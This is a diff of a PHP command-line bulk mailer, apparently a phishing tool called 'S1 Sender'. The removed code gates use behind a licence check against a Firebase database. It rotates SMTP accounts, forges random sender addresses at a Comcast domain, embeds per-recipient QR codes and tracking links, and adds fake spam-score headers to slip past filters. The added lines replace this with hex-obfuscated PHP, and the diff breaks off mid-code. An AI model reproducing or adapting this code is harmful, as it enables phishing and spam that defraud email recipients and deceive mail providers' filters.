@@ -1,2408 +1,363 @@
 #!/usr/bin/env php
-<?php
-
-require __DIR__.'/vendor/autoload.php';
-require 'settings.php';
-
-use Kreait\Firebase\Factory;
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-use BaconQrCode\Common\ErrorCorrectionLevel;
-use BaconQrCode\Encoder\Encoder;
-use BaconQrCode\Renderer\Image\Png;
-use Endroid\QrCode\QrCode;
-use BaconQrCode\Writer;
-use React\EventLoop\Factory as ReactFactory;
-use GuzzleHttp\Client;
-
-
-print("\033[1;33m
-  
-
-███████╗ ██╗██╗     ██████╗ ███╗   ██╗████████╗                ████████╗ ██████╗ ██████╗ ████████╗██╗   ██╗ ██████╗ ██████╗ ██████╗ 
-██╔════╝███║██║     ╚════██╗████╗  ██║╚══██╔══╝                ╚══██╔══╝██╔═████╗██╔══██╗╚══██╔══╝██║   ██║██╔════╝ ╚════██╗██╔══██╗
-███████╗╚██║██║      █████╔╝██╔██╗ ██║   ██║                      ██║   ██║██╔██║██████╔╝   ██║   ██║   ██║██║  ███╗ █████╔╝██████╔╝
-╚════██║ ██║██║      ╚═══██╗██║╚██╗██║   ██║                      ██║   ████╔╝██║██╔══██╗   ██║   ██║   ██║██║   ██║ ╚═══██╗██╔══██╗
-███████║ ██║███████╗██████╔╝██║ ╚████║   ██║       ███████╗       ██║   ╚██████╔╝██║  ██║   ██║   ╚██████╔╝╚██████╔╝██████╔╝██║  ██║
-╚══════╝ ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚══════╝       ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝
-                                                                                                                                    
-
-
-                                                            S1 Sender
-\033[0m");
-// Rest of your script...
-$serviceAccountUrl = 'https://cdn.jsdelivr.net/gh/zoeand101/S1_T0G/list/fb1.json';
-
-// Use GuzzleHttp client to fetch the contents of the JSON file
-$client = new Client();
-$response = $client->get($serviceAccountUrl);
-$jsonContent = (string) $response->getBody();
-
-// Initialize Firebase
-$factory = (new Factory)
-    ->withServiceAccount($jsonContent)
-    ->withDatabaseUri('https://f1ni-16ac3-default-rtdb.europe-west1.firebasedatabase.app');
-
-$database = $factory->createDatabase();
-
-function checkFirebaseUser($username, $password, $database) {
-    $usersRef = $database->getReference('users');
-
-    $users = $usersRef->getValue(); // Fetch all users
-
-    if ($users === null) {
-        return false; // No users found
-    }
-    $currentTimestamp = time(); // Get current UNIX timestamp
-    
-
-    foreach ($users as $userID => $userData) {
-        if (isset($userData['username']) && isset($userData['password'])) {
-            if ($userData['username'] === $username && $userData['password'] === $password) {
-                // Check if the user has an expiration date or is an admin (no expiration date)
-                if (isset($userData['expiration_timestamp'])) {
-                $expirationTimestamp = intval($userData['expiration_timestamp']);
-
-                    if ($expirationTimestamp >= $currentTimestamp) {
-                        return 'valid'; // Return a specific value indicating valid and not expired
-                    } else {
-                        return 'expired'; // Return a specific value indicating the account is expired
-                    }
-                } else {
-                    return 'admin'; // Return a specific value indicating an admin user
-                }
-            }
-        }
-    }
-
-    return false; // User not found or incorrect credentials
-}
-
-// Function to hide password input
-function hideInput($prompt = "Enter Password: ")
-{
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
-        // For non-Windows systems
-        echo $prompt;
-        system('stty -echo');
-        $password = trim(fgets(STDIN));
-        system('stty echo');
-        echo "\n";
-        return $password;
-    } else {
-        // For Windows systems
-        echo $prompt;
-        $password = rtrim(fgets(STDIN), "\r\n");
-        return $password;
-    }
-}
-
-// Prompt for user input
-echo "Enter username: ";
-$username = trim(fgets(STDIN)); // Read user input for username
-
-$password = hideInput("Enter password: ");
-
-$userStatus = checkFirebaseUser($username, $password, $database);
-
-if ($userStatus === 'valid') {
-    echo "\033[1;33m\n\n\t\tValid credentials. Welcome $username.\n\n\n";
- // Continue with the rest of your script
-
-    // Create a PHPMailer instance
-    $mail = new PHPMailer(true);
-
-    try {
+<?php 
+        ${"\x47L\x4fB\x41\x4c\x53"}["i\x65\x72p\x73_\x78h\x6cv\x7al\x62e\x62c\x6b\x71z\x74b\x74w\x67\x61\x72\x65h\x69o\x73w\x67u\x62"]="_\x5f";${"G\x4c\x4f\x42\x41L\x53"}["\x74\x6ba\x65\x65o\x79\x5f_\x70\x6fe\x6ft\x70p\x6df\x5fk\x5fr\x6f\x6bh\x66c\x67\x63"]="_";${${"G\x4cO\x42A\x4cS"}["i\x65\x72p\x73_\x78h\x6cv\x7al\x62e\x62c\x6b\x71z\x74b\x74w\x67\x61\x72\x65h\x69o\x73w\x67u\x62"]}="p\x72\x69\x6et\x66";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x74\x6ba\x65\x65o\x79\x5f_\x70\x6fe\x6ft\x70p\x6df\x5fk\x5fr\x6f\x6bh\x66c\x67\x63"]}="\x4co\x61d\x69n\x67 \x74h\x65\x20\x5b\x4eA\x4d\x45]\x20\x2e.\x2e";
         
-            $resends = 'resend.txt';
-            $failedEmailsFile = 'failed.txt';
-            $badlistFile = 'bad.txt';
-            $sentEmailsFile = 'pass.txt';
-            $validEmailsFile = 'valid.txt';
-            
-            // Function to empty files if they exist
-            function emptyFileIfExists($file) {
-                if (file_exists($file)) {
-                    file_put_contents($file, ''); // Empty the file
-                    echo "File '$file' emptied successfully.\n";
-                } else {
-                   
-                }
-            }
-            
-            // Empty the files if they exist
-            emptyFileIfExists($resends);
-            emptyFileIfExists($failedEmailsFile);
-            emptyFileIfExists($badlistFile);
-            emptyFileIfExists($sentEmailsFile);
-
-
-
-        // Check if there are multiple SMTP configurations
-     if (count($smtpSettings) > 1) {
-		 
-		 echo "\033[1;33mProceeding to send emails...\n";
-         
-$loop = React\EventLoop\Factory::create();
-  
-$settings = array_merge($recipientListSettings, $commonSettings, $customHeaderSettings);
-$recipientListFile = 'list/' . $settings['recipientListFile'];  // Update the path as needed
-
-$recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-
-if ($settings['removeDuplicates']) {
-    $recipientList = array_unique($recipientList);
-}
-
-if (empty($recipientList)) {
-    throw new Exception('You must provide at least one recipient email address.');
-}
-
-function sendEmail($recipient, $smtpConfig, $retryCount = 2) {
-    $mail = new PHPMailer(true);
-
-    $mail->isSMTP();
-    $mail->Host       = $smtpConfig['host'];
-    $mail->Port       = $smtpConfig['port'];
-    $mail->Username   = $smtpConfig['username'];
-    $mail->Password   = $smtpConfig['password'];
-    $mail->SMTPSecure = $smtpConfig['Auth'];
-    $mail->Hostname   = $smtpConfig['Hostname'];
-    $mail->SMTPAuth   = true;
-    $mail->SMTPKeepAlive = true;
-    $mail->Priority   = $smtpConfig['priority'];
-    $mail->Encoding = $smtpConfig['encoding'];
-    $mail->CharSet = $smtpConfig['charset'];
-    $mail->addAddress(trim($recipient));
-    
-    
-    
-                      $senderEmail = isset($settings['from']) ? $settings['from'] : '';
-                         if (!$senderEmail) {
-                         throw new Exception('Invalid sender email address.');
-                     }
-                       
-                        
-                        
-        		         $edomainn = explode('@', $email);
-                         $userId = $edomainn[0];
-                         $domains = $edomainn[1];
-                        
-                        
-                            $fmail = $settings['from'];
-                            $fname = $settings['fromname'];
-                            $subject = $settings['subject'];
-                    
-                          
-                        $getsmtpUsername = $smtpSettings[0]['username'];
-                         if ($settings['randSender'] == true) {
-                        $domainsmtp = "xfinity.comcast.net";
-                    	$mylength = rand(15,30);
-                    	$mail->Sender = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyz'),1,$mylength)."communication@".$domainsmtp;
-            //			
-                    } else {
-                       $mail->Sender = $fmail;
-                    }
-                        // Attachments
-                        
-                        
-                        
-                        if (!empty($settings['image_attachfile'])) {
-                            $imageAttachmentPath = 'attachment/' . $settings['image_attachfile']; // Update the path as needed
-                             if ($settings['displayimage'] == true) {
-                             $mail->addEmbeddedImage($imageAttachmentPath, 'imgslet', $settings['image_attachname'], 'base64', 'image/jpeg, image/jpg, image/png');
-                             }else{
-                                 $mail->addAttachment($imageAttachmentPath, $settings['image_attachfile']);
-                            }
-                            
-                        }
-                        
-                                        
-    
-
-                        if (!empty($settings['pdf_attachfile'])) {
-                            $mail->addAttachment($settings['pdf_attachfile']);
-                        }
-                         $link = explode('|', $commonSettings['link']);
-                        $b64link = base64_encode($commonSettings['linkb64']);
-                       
-                        
-                        
-                        if ($commonSettings['autolink'] == true) {
-            		    	$qrCode = new QrCode($commonSettings['qrlink'] . '?e=' . $email);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                      	    
-		        	    }else{
-		    	    
-		    	            $qrCode = new QrCode($commonSettings['qrlink']);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                        
-		            	}
-				    
-                             $qrCode->setSize(160); // Set the size of the QR code
-
-                                // Get QR code image data as base64
-                            $qrCodeBase64 = base64_encode($qrCode->writeString());
-                            $label = '<div style="text-align:center;font-size:16px;font-weight:bold;">Scan Me</div>';
-                            $qrCodeImage = '<img src="data:image/png;base64,' . $qrCodeBase64 . '" alt="Scan Me QR Code" style="display:block;margin:0 auto;">';
-            				
-				
-				
-                               
-                        
-                       $imageBase64 = ''; // Initialize $imageBase64 variable
-
-                        if (!empty($commonSettings['imageLetter'])) {
-                            $imagePath = 'attachment/' . $commonSettings['imageLetter'];
-                        
-                            if (file_exists($imagePath)) {
-                                $imageBase64 = base64_encode(file_get_contents($imagePath));
-                            } else {
-                                // Handle case when the file doesn't exist
-                                echo "The image file doesn't exist at $imagePath";
-                            }
-                        }
-                        
-                        // Use $imageBase64 as needed, ensuring it contains valid data
-                        $dataUri = !empty($imageBase64) ? 'data:image/png;base64,' . $imageBase64 : '';
-                        
-                                               
-                        $char9 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,9);
-        				$char8 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,8);
-        				$char7 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,7);
-        				$char6 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,6);
-        				$char5 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,5);
-        				$char4 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,4);
-        				$char3 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,3);
-        				$char2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,2);
-        				$CHARs2 = substr(str_shuffle(strtoupper("ABCDEFGHIJKLMNOPQRSTUVWXYZ")),0,2);
-        				$num9 = substr(str_shuffle("0123456789"),0,9);
-        				$num4 = substr(str_shuffle("0123456789"),0,4);
-        				$key64 = base64_encode($email);
-        			
-        
-                                $letterFile = 'letter/' . $settings['letterFile']; // Update the path as needed
-                                $letter = file_get_contents($letterFile) or die("Letter not found!");
-                                $letter = str_ireplace("##char8##", $char8, $letter);
-                                $letter = str_ireplace("##char7##", $char7, $letter);
-                                $letter = str_ireplace("##char6##", $char6, $letter);
-                                $letter = str_ireplace("##char5##", $char5, $letter);
-                                $letter = str_ireplace("##char4##", $char4, $letter);
-                                $letter = str_ireplace("##char3##", $char3, $letter);
-                        
-                                // ... (continue with your existing code)
-                        
-                        // Additional randomization features
-                        
-				          if ($commonSettings['randomparam'] == true) {
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)].'?id='.generatestring('mix', 8, 'normal'), $letter);
-            					$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            		            	}else{
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)], $letter);
-            		    		$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            					
-            		    	}
-                		    	$letter = str_ireplace("##date##", date('D, F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date2##", date('D, F d, Y') , $letter);
-                                $letter = str_ireplace("##date3##", date('F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date4##", date('F d, Y') , $letter);
-                				$letter = str_ireplace("##date5##", date('F d') , $letter);
-                				$letter = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $letter);
-                				$letter = str_ireplace("##email##", $email , $letter);
-                				$letter = str_ireplace("##email64##", $key64 , $letter);
-                				$letter = str_ireplace("##link64##", $b64link, $letter);
-                				$letter = str_ireplace("##char9##", $char9, $letter);
-                       			$letter = str_ireplace("##char8##", $char8, $letter);
-                				$letter = str_ireplace("##char7##", $char7, $letter);
-                				$letter = str_ireplace("##char6##", $char6, $letter);
-                				$letter = str_ireplace("##char5##", $char5, $letter);
-                				$letter = str_ireplace("##char4##", $char4, $letter);
-                				$letter = str_ireplace("##char3##", $char3, $letter);
-                				$letter = str_ireplace("##char2##", $char2, $letter);
-                				$letter = str_ireplace("##CHARs2##", $CHARs2, $letter);
-                				$letter = str_ireplace("##num4##", $num4, $letter);
-                				$letter = str_ireplace("##userid##", $userId, $letter);
-                				$letter = str_ireplace("##domain##", $domains,  $letter);
-                				$letter = str_ireplace("##imglet##", $dataUri, $letter);
-                        	    $letter = str_ireplace("##qrcode##", '<div style="text-align: center;"><img src="data:image/png;base64,' . $qrCodeBase64 . '" ></div>', $letter);
-                        	    $letter = str_ireplace("##URLqrcode##", '<div style="text-align: center;"><a href="' . $link[array_rand($link)] . '" target="_blank"><img src="data:image/png;base64,' . $qrCodeBase64 . '"></a></div>', $letter);
-        
-                	
-
-
-                       // Replace placeholders in the subject with the current date
-                        
-                                $subject = str_ireplace("##date##", date('D, F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date2##", date('D, F d, Y') , $subject);
-                                $subject = str_ireplace("##date3##", date('F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date4##", date('F d, Y') , $subject);
-                				$subject = str_ireplace("##date5##", date('F d') , $subject);
-                				$subject = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $subject);
-                				$subject = str_ireplace("##email##", $email , $subject);
-                				$subject = str_ireplace("##email64##", $key64 , $subject);
-                				$subject = str_ireplace("##link64##", $b64link, $subject);
-                				$subject = str_ireplace("##char9##", $char9, $subject);
-                       			$subject = str_ireplace("##char8##", $char8, $subject);
-                				$subject = str_ireplace("##char7##", $char7, $subject);
-                				$subject = str_ireplace("##char6##", $char6, $subject);
-                				$subject = str_ireplace("##char5##", $char5, $subject);
-                				$subject = str_ireplace("##char4##", $char4, $subject);
-                				$subject = str_ireplace("##char3##", $char3, $subject);
-                				$subject = str_ireplace("##char2##", $char2, $subject);
-                				$subject = str_ireplace("##userid##", $userId, $subject);
-                				$subject = str_ireplace("##CHARs2##", $CHARs2, $subject);
-                				$subject = str_ireplace("##num4##", $num4, $subject);
-                				$subject = str_ireplace("##num9##", $num9, $subject);
-                				$subject = str_ireplace("##domain##", $domains,  $subject);
-                    
-                        // Set the subject
-                       
-                             // Check if the sender's email is valid
-                        
-			
-                               
-		       	        
-                                
-                                $fmail = str_ireplace("##domain##", $domains, $fmail);
-                                $fmail = str_ireplace("##userid##", $userId, $fmail);
-                                $fmail = str_ireplace("##relay##", $getsmtpUsername, $fmail);
-                                $fmail = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date2##", date('D, F d, Y') , $fmail);
-                                $fmail = str_ireplace("##date3##", date('F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date4##", date('F d, Y') , $fmail);
-                				$fmail = str_ireplace("##date5##", date('F d') , $fmail);
-                				$fmail = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fmail);
-                				$fmail = str_ireplace("##email##", $email , $fmail);
-                				$fmail = str_ireplace("##email64##", $key64 , $fmail);
-                				$fmail = str_ireplace("##char9##", $char9, $fmail);
-                       			$fmail = str_ireplace("##char8##", $char8, $fmail);
-                				$fmail = str_ireplace("##char7##", $char7, $fmail);
-                				$fmail = str_ireplace("##char6##", $char6, $fmail);
-                				$fmail = str_ireplace("##char5##", $char5, $fmail);
-                				$fmail = str_ireplace("##char4##", $char4, $fmail);
-                				$fmail = str_ireplace("##char3##", $char3, $fmail);
-                				$fmail = str_ireplace("##char2##", $char2, $fmail);
-                				$fmail = str_ireplace("##CHARs2##", $CHARs2, $fmail);
-                				$fmail = str_ireplace("##num4##", $num4, $fmail);
-                				$fmail = str_ireplace("##num9##", $num9, $fmail);
-                                
-                                $fname = str_ireplace("##domain##", $domains, $fname); 
-                                $fname = str_ireplace("##userid##", $userId, $fname);
-                                $fname = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date2##", date('D, F d, Y') , $fname);
-                                $fname = str_ireplace("##date3##", date('F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date4##", date('F d, Y') , $fname);
-                				$fname = str_ireplace("##date5##", date('F d') , $fname);
-                				$fname = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fname);
-                				$fname = str_ireplace("##email##", $email , $fname);
-                				$fname = str_ireplace("##email64##", $key64 , $fname);
-                				$fname = str_ireplace("##char9##", $char9, $fname);
-                       			$fname = str_ireplace("##char8##", $char8, $fname);
-                				$fname = str_ireplace("##char7##", $char7, $fname);
-                				$fname = str_ireplace("##char6##", $char6, $fname);
-                				$fname = str_ireplace("##char5##", $char5, $fname);
-                				$fname = str_ireplace("##char4##", $char4, $fname);
-                				$fname = str_ireplace("##char3##", $char3, $fname);
-                				$fname = str_ireplace("##char2##", $char2, $fname);
-                				$fname = str_ireplace("##CHARs2##", $CHARs2, $fname);
-                				$fname = str_ireplace("##num4##", $num4, $fname);
-                				$fname = str_ireplace("##num9##", $num9, $fname);
-                      
-                              	 
-
-            		    
-            		     if ($settings['encodeFromInfo']) {
-                           $mail->setFrom($fmail,  '=?UTF-8?B?' . base64_encode($fname) . '?=');
-                        } else {
-                        $mail->setFrom($fmail, $fname);
-                        
-                       }
-            		    
-            		    if ($settings['encodeSubject']) {
-                        
-                        $mail->Subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
-                        } else {
-                            $mail->Subject = $subject;
-                        }
-                        
-                  
-                      	if (!function_exists('generateRandomEmail')) {
-                                  function generateRandomEmail() {
-                                        $characters = 'abcdefghijklmnopqrstuvwxyz';
-                                        $randomString = '';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '@';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '.com';
-                                        return $randomString;
-                                    }
-                      	 }
-                      	 if (!function_exists('generateRandomNumber')) {
-                                 function generateRandomNumber() {
-                                                    return mt_rand(1000000000, 9999999999); // Random number between 100000 and 999999
-                                                }
-                                                
-                                    }            // Generate a random email
-                                                $randomEmail = generateRandomEmail();
-                                                
-                                                // Generate a random number
-                                                $randomNumber = generateRandomNumber();
-                                                
-                                                $randomIP = generateRandomIP();
-                      	 
-                                    
-
-
-
-                                 $fixedHeaders = [
-                                                    'Content-Type' => 'text/html; charset=utf-8',
-                                                    'Content-Transfer-Encoding' => 'quoted-printable',
-                                                    'Message-ID' => "<$randomNumber@example.com>",
-                                                    'Date' => 'Thu, 07 Dec 2023 02:26:12 GMT',
-                                                    'Priority' => 'normal',
-                                                    'Importance' => 'normal',
-                                                    'X-Priority' => '=?UTF-8?Q?=221_=28Highest=29=22?=',
-                                                    'X-Msmail-Priority' => '=?UTF-8?Q?=22High=22?=',
-                                                    'Reply-To' => $fmail,
-                                                    'In-Reply-To' => '<previous-message-id@smtp.comcast.net>',
-                                                    'References' => '<previous-message-id@smtp.comcast.net>',
-                                                    'X-Auto-Response-Suppress' => '=?UTF-8?Q?=22OOF=2C_DR=2C_RN=2C_NRN=2C_AutoReply?= =?UTF-8?Q?=22?=', 
-                                                    'X-Mailer' => '=?UTF-8?Q?=22Your_Custom_Mailer=22?=',
-                                                    'Return-Receipt-To' => $randomEmail,
-                                                    'Disposition-Notification-To' => $randomEmail,
-                                                    'X-Confirm-Reading-To' => $randomEmail,
-                                                    'X-Unsubscribe' => $randomEmail,
-                                                    'List-Unsubscribe' => $randomEmail,
-                                                    'X-Report-Abuse' => $randomEmail,
-                                                    'Precedence' => 'bulk',
-                                                    'X-Bulk' => 'bulk',
-                                                    'X-Spam-Status' => 'No, score=-2.7',
-                                                    'X-Spam-Score' => '-2.7',
-                                                    'X-Spam-Bar' => '/',
-                                                    'X-Spam-Flag' => 'NO',
-                                             //       'X-Originating-IP' => $randomIP,
-                                                    'To' => $email
-                                                ];
-                                                      
-                                                
-                                                            // Check if the customHeaders key exists and is an array
-                            if (isset($customHeaderSettings['customHeaders']) && is_array($customHeaderSettings['customHeaders'])) {
-                                // Retrieve the custom headers
-                                $customHeaders = $customHeaderSettings['customHeaders'];
-                            
-                                // Merge fixed headers with custom headers
-                                $allHeaders = array_merge($fixedHeaders, $customHeaders);
-                            
-                                // Loop through all merged headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                   
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            } else {
-                                // If custom headers are not properly defined, use only the fixed headers
-                                $allHeaders = $fixedHeaders;
-                            
-                                // Loop through fixed headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                  
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            }
-                        
-                        $mail->isHTML(true);
-                        $mail->Body    = $letter;
-     
-                       
-                        
-
-    try {
-        if ($mail->send()) {
-            echo "Message sent successfully to $recipient using SMTP: {$smtpConfig['username']}\n";
-            return true;
-        } else {
-            echo 'Mailer Error: ' . $mail->ErrorInfo . " to $recipient using SMTP: {$smtpConfig['username']}\n";
-            if ($retryCount > 0) {
-                echo "Retrying sending to $recipient using SMTP: {$smtpConfig['username']} (Retry Count: $retryCount)\n";
-                return sendEmail($recipient, $smtpConfig, $retryCount - 1);
-            } else {
-                echo "Failed to send to $recipient after retries using SMTP: {$smtpConfig['username']}\n";
-                return false;
-            }
-        }
-    } catch (Exception $e) {
-        echo 'Caught exception: ' . $e->getMessage() . "\n";
-        return false;
-    }
-}
-
-
-
-$threadCount = isset($settings['threads']) && $settings['threads'] > 1 ? $settings['threads'] : 1;
-echo "Thread count: $threadCount\n"; // Echo the thread count
-
-$smtpCount = count($smtpSettings); // Initialize $smtpCount with the count of SMTP configurations
-$smtpIndex = 0; // Initialize $smtpIndex
-
-if ($threadCount > 1) {
-    $chunks = array_chunk($recipientList, ceil(count($recipientList) / $threadCount));
-
-    $childProcesses = [];
-
-    foreach ($chunks as $chunk) {
-        $pid = pcntl_fork();
-
-        if ($pid == -1) {
-            die("Error forking process.");
-        } elseif ($pid) {
-            $childProcesses[] = $pid;
-        } else {
-            foreach ($chunk as $recipient) {
-                $smtpConfig = $smtpSettings[$smtpIndex % $smtpCount];
-                sendEmail($recipient, $smtpConfig);
-                $smtpIndex++;
-            }
-            exit(); // Exit the child process after sending emails in the chunk
-        }
-    }
-
-    // Wait for child processes to finish
-    foreach ($childProcesses as $pid) {
-        pcntl_waitpid($pid, $status);
-    }
-} else {
-    // Single-threaded logic as before
-    foreach ($recipientList as $recipient) {
-        $smtpConfig = $smtpSettings[$smtpIndex % $smtpCount];
-        sendEmail($recipient, $smtpConfig);
-        $smtpIndex++;
-    }
-}
-
-$loop->run();
-
-} else {
-            // Use the only available SMTP configuration
-            $settings = array_merge(reset($smtpSettings), $recipientListSettings, $customHeaderSettings, $commonSettings);
-
-            // Use the number of threads specified in commonSettings or default to 1 if not provided
-            $numThreads = empty($settings['threads']) ? 1 : intval($settings['threads']);
-
-            // Load recipient list from file
-            $recipientListFile = 'list/' . $settings['recipientListFile'];  // Update the path as needed
-            $recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-
-            // Remove duplicates if specified
-            if ($settings['removeDuplicates']) {
-                $recipientList = array_unique($recipientList);
-            }
-
-            // Check if recipient list is empty or has at least one recipient
-            if (empty($recipientList)) {
-                throw new Exception('You must provide at least one recipient email address.');
-            }
-             
-             $numEmails = count($recipientList);
-                
-                // Echo the number of emails
-                echo "\n\033[1;33mNumber of emails: $numEmails";
-                 echo "\n\033[1;33mNumber of smtp: 1\n";
-                 echo "\n\033[1;33mProceeding to send emails...\n";
-            // Divide the recipient list into chunks based on the number of threads
-           $chunks = array_chunk($recipientList, max(1, ceil(count($recipientList) / $numThreads)));
-
-// Create a separate process for each thread
-            $pids = [];
-            for ($i = 0; $i < $numThreads; $i++) {
-                $pid = pcntl_fork();
-            
-                if ($pid == -1) {
-                    die("Could not fork.\n");
-                } elseif ($pid) {
-                    // Parent process
-                    $pids[] = $pid;
-                } else {
-                    // Child process
-                    if (isset($chunks[$i]) && is_array($chunks[$i])) {
-                        $start = $i * count($chunks[$i]);
-                        $end = min(($i + 1) * count($chunks[$i]), count($recipientList));
-            
-                        // Load a new instance of PHPMailer in each thread
-                        $mail = new PHPMailer(true);
-                                
-                                
-         function generateRandomIP() {
-             
-                    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
-            
-             }
-             
-             $maxConsecutiveFailures = $settings['ErrorHandling'];
-
-// Counter to track consecutive failures
-            $consecutiveFailures = 0;
-            
-         
-            
-                   // Load email addresses from the recipient list
-            foreach ($chunks[$i] as $email) {
-                        $mail->addAddress($email);
-                
-                         // Server settings
-                        $mail->isSMTP();
-                        $mail->Host       = $settings['host'];
-                        $mail->Port       = $settings['port'];
-                        $mail->Username   = $settings['username'];
-                        $mail->Password   = $settings['password'];
-                        $mail->SMTPSecure = $settings['Auth'];
-                        $mail->Hostname   = $settings['Hostname'];
-                        $mail->SMTPAuth   = true;
-                        $mail->SMTPKeepAlive = true;
-                        $mail->Priority   = $settings['priority'];
-            		    $mail->Encoding = $settings['encoding'];
-            		    $mail->CharSet = $settings['charset'];
-                                    
-
-                      $senderEmail = isset($settings['from']) ? $settings['from'] : '';
-                         if (!$senderEmail) {
-                         throw new Exception('Invalid sender email address.');
-                     }
-                       
-                        
-                        
-        		         $edomainn = explode('@', $email);
-                         $userId = $edomainn[0];
-                         $domains = $edomainn[1];
-                        
-                        
-                            $fmail = $settings['from'];
-                            $fname = $settings['fromname'];
-                            $subject = $settings['subject'];
-                    
-                          
-                        $getsmtpUsername = $smtpSettings[0]['username'];
-                         if ($settings['randSender'] == true) {
-                        $domainsmtp = "xfinity.comcast.net";
-                    	$mylength = rand(15,30);
-                    	$mail->Sender = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyz'),1,$mylength)."communication@".$domainsmtp;
-            //			
-                    } else {
-                       $mail->Sender = $fmail;
-                    }
-                        // Attachments
-                        
-                        
-                        
-                        if (!empty($settings['image_attachfile'])) {
-                            $imageAttachmentPath = 'attachment/' . $settings['image_attachfile']; // Update the path as needed
-                             if ($settings['displayimage'] == true) {
-                             $mail->addEmbeddedImage($imageAttachmentPath, 'imgslet', $settings['image_attachname'], 'base64', 'image/jpeg, image/jpg, image/png');
-                             }else{
-                                 $mail->addAttachment($imageAttachmentPath, $settings['image_attachfile']);
-                            }
-                            
-                        }
-                        
-                                        
-    
-
-                        if (!empty($settings['pdf_attachfile'])) {
-                            $mail->addAttachment($settings['pdf_attachfile']);
-                        }
-                         $link = explode('|', $commonSettings['link']);
-                        $b64link = base64_encode($commonSettings['linkb64']);
-                       
-                        
-                        
-                        if ($commonSettings['autolink'] == true) {
-            		    	$qrCode = new QrCode($commonSettings['qrlink'] . '?e=' . $email);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                      	    
-		        	    }else{
-		    	    
-		    	            $qrCode = new QrCode($commonSettings['qrlink']);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                        
-		            	}
-				    
-                             $qrCode->setSize(160); // Set the size of the QR code
-
-                                // Get QR code image data as base64
-                            $qrCodeBase64 = base64_encode($qrCode->writeString());
-                            $label = '<div style="text-align:center;font-size:16px;font-weight:bold;">Scan Me</div>';
-                            $qrCodeImage = '<img src="data:image/png;base64,' . $qrCodeBase64 . '" alt="Scan Me QR Code" style="display:block;margin:0 auto;">';
-            				
-				
-				
-                               
-                        
-                       $imageBase64 = ''; // Initialize $imageBase64 variable
-
-                        if (!empty($commonSettings['imageLetter'])) {
-                            $imagePath = 'attachment/' . $commonSettings['imageLetter'];
-                        
-                            if (file_exists($imagePath)) {
-                                $imageBase64 = base64_encode(file_get_contents($imagePath));
-                            } else {
-                                // Handle case when the file doesn't exist
-                                echo "The image file doesn't exist at $imagePath";
-                            }
-                        }
-                        
-                        // Use $imageBase64 as needed, ensuring it contains valid data
-                        $dataUri = !empty($imageBase64) ? 'data:image/png;base64,' . $imageBase64 : '';
-                        
-                                               
-                        $char9 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,9);
-        				$char8 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,8);
